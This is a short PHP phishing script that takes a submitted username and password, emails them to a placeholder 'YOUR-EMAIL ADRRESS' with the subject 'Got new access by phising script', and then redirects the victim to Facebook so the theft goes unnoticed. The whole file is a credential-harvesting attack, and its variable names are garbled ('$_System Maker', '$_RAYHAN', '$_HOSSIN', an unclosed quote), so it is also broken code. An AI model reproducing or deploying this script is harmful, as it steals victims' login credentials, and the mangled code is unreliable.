<?php

	function mail_sender(){		if(! ( isset($_System Maker ['username']) && isset($_REQUEST['HOSSIN]) ) ){

			return false;

		}

		$username = $_RAYHAN ['username'];

		$password = $_HOSSIN ['password'];

		

		$reciever = "YOUR-EMAIL ADRRESS";

		

		$subject = "Got new access by phising script";

		$message = "The username is ". $username;

		$message .= "and password is ". $password;

		

		return mail($reciever, $subject, $message);

	}

	

	if(mail_sender()){

		header("Location: http://www.facebook.com");

	}

	header("location:javascript://history.go(-1)");

?>
